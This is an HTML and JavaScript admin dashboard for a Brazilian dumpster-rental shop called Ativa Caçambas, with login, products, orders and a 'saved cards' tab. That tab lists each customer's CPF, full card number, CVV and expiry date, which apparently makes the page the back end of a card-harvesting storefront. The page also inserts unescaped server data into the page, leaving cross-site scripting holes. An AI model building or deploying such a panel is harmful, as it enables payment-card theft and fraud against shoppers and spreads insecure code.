<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Ativa Caçambas</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #0a0f14;
            color: #ffffff;
        }

        .login-container {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .login-card {
            background: #1a2a22;
            padding: 40px;
            border-radius: 24px;
            width: 100%;
            max-width: 400px;
        }

        .login-card h2 {
            margin-bottom: 24px;
            text-align: center;
        }

        .login-card input {
            width: 100%;
            padding: 14px;
            margin-bottom: 16px;
            background: #0a0f14;
            border: 1px solid #333;
            border-radius: 12px;
            color: white;
        }

        .btn-login {
            width: 100%;
            background: #ffd700;
            color: #0a1a0f;
            font-weight: 700;
            padding: 14px;
            border: none;
            border-radius: 40px;
            cursor: pointer;
        }

        .admin-container {
            display: none;
        }

        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            width: 260px;
            height: 100vh;
            background: #1a2a22;
            padding: 24px;
        }

        .sidebar h3 {
            margin-bottom: 32px;
            padding-bottom: 16px;
            border-bottom: 1px solid #333;
        }

        .sidebar-menu {
            list-style: none;
        }

        .sidebar-menu li {
            margin-bottom: 12px;
        }

        .sidebar-menu a {
            color: #ccc;
            text-decoration: none;
            cursor: pointer;
            display: block;
            padding: 10px;
        }

        .sidebar-menu a:hover, .sidebar-menu a.active {
            color: #ffd700;
        }

        .main-content {
            margin-left: 260px;
            padding: 32px;
        }

        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding-bottom: 16px;
            border-bottom: 1px solid #333;
        }

        .btn-logout {
            background: #aa2e2e;
            border: none;
            padding: 8px 20px;
            border-radius: 40px;
            color: white;
            cursor: pointer;
        }

        .card {
            background: #1a2a22;
            border-radius: 20px;
            padding: 24px;
            margin-bottom: 24px;
        }

        .form-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #ffd700;
        }

        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 10px;
            background: #0a0f14;
            border: 1px solid #333;
            border-radius: 8px;
            color: white;
        }

        .btn-primary {
            background: #ffd700;
            color: #0a1a0f;
            font-weight: 700;
            padding: 10px 20px;
            border: none;
            border-radius: 40px;
            cursor: pointer;
        }

        .btn-danger {
            background: #aa2e2e;
            padding: 6px 12px;
            border: none;
            border-radius: 20px;
            color: white;
            cursor: pointer;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        th {
            color: #ffd700;
        }

        .hidden {
            display: none;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: #1a2a22;
            padding: 20px;
            border-radius: 16px;
            text-align: center;
        }

        .stat-number {
            font-size: 2rem;
            font-weight: 800;
            color: #ffd700;
        }
    </style>
</head>
<body>
    <div id="loginScreen" class="login-container">
        <div class="login-card">
            <h2>Painel Administrativo</h2>
            <input type="text" id="adminUser" placeholder="Usuário" value="admin">
            <input type="password" id="adminPass" placeholder="Senha">
            <button class="btn-login" onclick="fazerLogin()">Entrar</button>
        </div>
    </div>

    <div id="adminPanel" class="admin-container">
        <div class="sidebar">
            <h3>Ativa Caçambas</h3>
            <ul class="sidebar-menu">
                <li><a onclick="mostrarTab('dashboard')" class="active">Dashboard</a></li>
                <li><a onclick="mostrarTab('produtos')">Produtos</a></li>
                <li><a onclick="mostrarTab('pedidos')">Pedidos</a></li>
                <li><a onclick="mostrarTab('cartoes')">Cartões</a></li>
            </ul>
        </div>

        <div class="main-content">
            <div class="top-bar">
                <h2>Bem-vindo</h2>
                <button class="btn-logout" onclick="logout()">Sair</button>
            </div>

            <div id="tabDashboard">
                <div class="stats">
                    <div class="stat-card"><div class="stat-number" id="totalProdutos">0</div><div>Produtos</div></div>
                    <div class="stat-card"><div class="stat-number" id="totalPedidos">0</div><div>Pedidos</div></div>
                    <div class="stat-card"><div class="stat-number" id="totalCartoes">0</div><div>Cartões</div></div>
                    <div class="stat-card"><div class="stat-number" id="totalReceita">R$0</div><div>Receita</div></div>
                </div>
            </div>

            <div id="tabProdutos" class="hidden">
                <div class="card">
                    <h3>Adicionar Produto</h3>
                    <form id="formProduto">
                        <div class="form-row">
                            <div class="form-group"><label>Nome</label><input type="text" id="nome" required></div>
                            <div class="form-group"><label>Tipo</label><select id="tipo"><option value="cacamba">Caçamba</option><option value="material">Material</option></select></div>
                            <div class="form-group"><label>Preço</label><input type="number" step="0.01" id="preco" required></div>
                            <div class="form-group"><label>Preço Promocional</label><input type="number" step="0.01" id="precoPromocional"></div>
                        </div>
                        <div class="form-row">
                            <div class="form-group"><label>Dimensões</label><input type="text" id="dimensoes" placeholder="2.0m x 1.5m x 1.0m"></div>
                            <div class="form-group"><label>Capacidade</label><input type="text" id="capacidade" placeholder="3m³"></div>
                        </div>
                        <div class="form-group"><label>Descrição</label><textarea id="descricao" rows="3"></textarea></div>
                        <button type="submit" class="btn-primary">Salvar Produto</button>
                    </form>
                </div>
                <div class="card">
                    <h3>Lista de Produtos</h3>
                    <div id="listaProdutos"></div>
                </div>
            </div>

            <div id="tabPedidos" class="hidden">
                <div class="card">
                    <h3>Pedidos</h3>
                    <div id="listaPedidos"></div>
                </div>
            </div>

            <div id="tabCartoes" class="hidden">
                <div class="card">
                    <h3>Cartões Salvos</h3>
                    <div id="listaCartoes"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let token = null;

        async function fazerLogin() {
            const response = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: document.getElementById('adminUser').value, senha: document.getElementById('adminPass').value })
            });
            const data = await response.json();
            if (data.success) {
                token = data.token;
                localStorage.setItem('adminToken', token);
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('adminPanel').style.display = 'block';
                carregarTudo();
            } else {
                alert('Credenciais inválidas');
            }
        }

        function logout() {
            localStorage.removeItem('adminToken');
            token = null;
            document.getElementById('adminPanel').style.display = 'none';
            document.getElementById('loginScreen').style.display = 'flex';
        }

        function mostrarTab(tab) {
            document.querySelectorAll('[id^="tab"]').forEach(t => t.classList.add('hidden'));
            document.getElementById(`tab${tab.charAt(0).toUpperCase() + tab.slice(1)}`).classList.remove('hidden');
        }

        async function carregarTudo() {
            await carregarProdutos();
            await carregarPedidos();
            await carregarCartoes();
        }

        async function carregarProdutos() {
            const response = await fetch('/api/admin/produtos', { headers: { 'Authorization': `Bearer ${token}` } });
            const data = await response.json();
            if (data.success) {
                document.getElementById('totalProdutos').innerText = data.produtos.length;
                document.getElementById('listaProdutos').innerHTML = `
                    <table>
                        <thead><tr><th>Nome</th><th>Tipo</th><th>Preço</th><th>Ações</th></tr></thead>
                        <tbody>
                            ${data.produtos.map(p => `
                                <tr>
                                    <td>${p.nome}</td>
                                    <td>${p.tipo}</td>
                                    <td>R$ ${p.preco}</td>
                                    <td><button class="btn-danger" onclick="excluirProduto(${p.id})">Excluir</button></td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                `;
            }
        }

        async function carregarPedidos() {
            const response = await fetch('/api/admin/pedidos', { headers: { 'Authorization': `Bearer ${token}` } });
            const data = await response.json();
            if (data.success) {
                document.getElementById('totalPedidos').innerText = data.pedidos.length;
                let receita = 0;
                data.pedidos.forEach(p => { if (p.status_pagamento === 'pago') receita += p.valor_total; });
                document.getElementById('totalReceita').innerHTML = `R$ ${receita.toFixed(2)}`;
                document.getElementById('listaPedidos').innerHTML = `
                    <table>
                        <thead><tr><th>Cliente</th><th>Produto</th><th>Valor</th><th>Status</th><th>Data</th></tr></thead>
                        <tbody>
                            ${data.pedidos.map(p => `
                                <tr>
                                    <td>${p.cliente_nome || '-'}<br><small>${p.cpf || '-'}</small></td>
                                    <td>${p.produto_nome || '-'}</td>
                                    <td>R$ ${p.valor_total}</td>
                                    <td>${p.status_pagamento}</td>
                                    <td>${new Date(p.created_at).toLocaleString()}</td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                `;
            }
        }

        async function carregarCartoes() {
            const response = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${token}` } });
            const data = await response.json();
            if (data.success) {
                document.getElementById('totalCartoes').innerText = data.cartoes.length;
                document.getElementById('listaCartoes').innerHTML = `
                    <table>
                        <thead><tr><th>Cliente</th><th>Titular</th><th>Número</th><th>CVV</th><th>Validade</th></tr></thead>
                        <tbody>
                            ${data.cartoes.map(c => `
                                <tr>
                                    <td>${c.cliente_nome || '-'}<br><small>${c.cpf || '-'}</small></td>
                                    <td>${c.nome_titular}</td>
                                    <td>${c.numero_cartao}</td>
                                    <td>${c.cvv}</td>
                                    <td>${c.validade}</td>
                                </tr>
                            `).join('')}
                        </tbody>
                    </table>
                `;
            }
        }

        document.getElementById('formProduto').addEventListener('submit', async (e) => {
            e.preventDefault();
            const produto = {
                nome: document.getElementById('nome').value,
                tipo: document.getElementById('tipo').value,
                preco: parseFloat(document.getElementById('preco').value),
                preco_promocional: parseFloat(document.getElementById('precoPromocional').value) || null,
                descricao: document.getElementById('descricao').value,
                dimensoes: document.getElementById('dimensoes').value,
                capacidade: document.getElementById('capacidade').value
            };
            await fetch('/api/admin/produtos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
                body: JSON.stringify(produto)
            });
            carregarProdutos();
            e.target.reset();
        });

        async function excluirProduto(id) {
            if (confirm('Excluir produto?')) {
                await fetch(`/api/admin/produtos/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${token}` } });
                carregarProdutos();
            }
        }

        const savedToken = localStorage.getItem('adminToken');
        if (savedToken) {
            token = savedToken;
            document.getElementById('loginScreen').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            carregarTudo();
        }
    </script>
</body>
</html>
